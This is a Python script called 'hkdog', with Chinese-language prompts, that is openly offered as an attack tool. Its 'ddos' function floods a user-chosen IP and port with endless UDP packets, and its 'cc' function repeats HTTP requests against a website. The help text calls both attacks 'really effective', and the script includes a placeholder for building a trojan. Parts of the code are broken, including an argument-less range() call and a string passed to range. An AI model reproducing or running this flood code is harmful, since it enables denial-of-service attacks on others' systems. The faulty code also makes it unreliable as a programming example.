'''python3'''

import time
import random
import os
import socket
import random
import requests


def ddos(): 
    
    

   
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)


    os.system("clear")
    os.system("figlet DDos Attack")
    print (" ")
    print ("/-----------------------------------------------------\ ")
    print ("|   作者          : midikafeijuren                    |")
    print ("|   作者github    : https://github.com/midikafeijuren |")
    print ("|                                                     |")
    print ("|   版本          : V1.0.0                            |")
    print ("\-----------------------------------------------------/")
    print (" ")
    print (" -----------------[   hkdog ddos   ]----------------- ")
    print (" ")
    ip = input("请输入 IP     : ")
    port = int(input("攻击端口      : "))
    sd = int(input("攻击速度(1~1000) : "))

    os.system("clear")

    sent = 0
    while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
        time.sleep((1000-sd)/2000)

def hkdog_zb():
    '''用来装b,没有真正发起攻击'''
    while True:
                  
        first2_ = str(random.randint(000,999))
        first_ = str(random.randint(000,999))
        first3_ = str(random.randint(000,999))
        first4_ = str(random.randint(000,999))
        end_first_ = first_ + "." + first2_ + "." + first3_ + "." + first4_
        first2 = str(random.randint(000,999))
        first = str(random.randint(000,999))
        first3 = str(random.randint(000,999))
        first4 = str(random.randint(000,999))
        end_first = first + "." + first2 + "." + first3 + "." + first4
        print(f"hak spend {end_first_} ==>>> {end_first}")
        time.sleep(0.05)

def hkdog_help():
    '''帮助'''
    print("版本号:v1.0.5 装bi攻击两用版")
    print("code                   meaning")
    print("-----------------------------------------")
    print("版本号                  查询版本")
    print("hkdog -zb              发送数据包[假]    ")
    print("ddos                   ddos攻击[真实有效]")
    print("cc                     cc攻击[真实有效]")
    print("")
    print("常见问题")
    print("_________________________________________")
    print("如果ddos刚输入完攻击速度就报错那么有可能是ip,端口,攻击速度不符合输入格式")

def jt():
    '''进度条'''
    a = 0
    b = '  '
    c = ' '
    for a in range(0,10):

        print(f"{b}{a}%","[","▋" * (a)," " * (99 - a),"]",end="\r")
		
        time.sleep(0.05)
	
    for a in range(10,100):
        
         
		
        print(f"{c}{a}%","[","▋" * (a)," " * (99 - a),"]",end="\r")
		
        time.sleep(0.05)
    print(f"100% [ ▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋ ]")


def line():
    print("line ready")
    for i in range():
        
        print("hake")
		

def text():
    '''hkdog的图标'''
    print("\033[1;31;1m                                                                            ")
    print(" __      ^    !   __     __                                                     ")
    print("|  |             |  |   /  /             &                        9                   ")
    print("|  |@       #    |  | /  /   $                           %     ()                     ")
    print("|  |            @|  |/  /          9           @                                ")
    print("|  \______ %     |      \    @       *     ()           %               %         *         ")
    print("|         |   () |  |-\  \         #         %            9                              ")
    print("|  |---|  |      |  |  \  \                                          %            ")
    print("|  |   |  |    * |  |   \  \           _____   %  ______     _____         ^      ")
    print("|  |   |  | $    |  |    \  \   ^     | ---\ \   /  __  \   / /-\ \              ")
    print("|  |   |  |      |  |     \  \        | |  | |   | |  | |   \___  |   &     ")
    print("\--/   \--/      \--/      \-/   9    | |--| |   | |__| |   ^___| |              ")
    print("                                      \_____/    \-----/    \-----/       $      \033[0m'  ")
    print("\033[1;31;1mhkdog v1.0.5")
    print('welcome by midi\033[0m') 
    print("-h for help")

#木马项目正在开发中
def muma(myip,ortherip,host):
    '''make a muma'''
    print("\033[1;31;1m you can use this to make a 木马")
    geshi = input("are you sure to make a control  app")
    

    
#cc攻击
def cc():
    '''cc攻击'''
    url = input("网站地址:")
    num_requests = input("请求数量:")
    for _ in range(num_requests):
        response = requests.get(url)
        if response.status_code != 200:
            print("Request failed with status code:", response.status_code)
 
def key_bong_zb():
    pass






def main():
    '''主函数'''
    text()
    jt()
    time.sleep(0.5)
    #jt()
    print("hkdog is ok!")
    time.sleep(0.5)
    print("hk time!")
    time.sleep(0.7)
    life = True
    while life:
        dm = input("\033[1;31;1m hkdog>>> \033[0m")
        if dm == "help" or "-h" or "-help" or "h":
            hkdog_help()
        if dm == "版本号":
            print("装bi攻击两用版")
	
        if dm == "hkdog -zb":
            try:

                hkdog_zb()
            except:
                print("\033[1;31;1mworning")
                print("the hake zb is worning or your are stop the send")
                
        if dm == "ddos":
            
            try:
             
                ddos()
            except:
                print("\033[1;31;1mworning")
                print("the ddos is worning or your are stop the send")

        if dm == "cc":
            try:
                cc()

            except:
                print("the cc is worning or your are stop the send")
 
                
                
              
 





if __name__ == '__main__':
	main()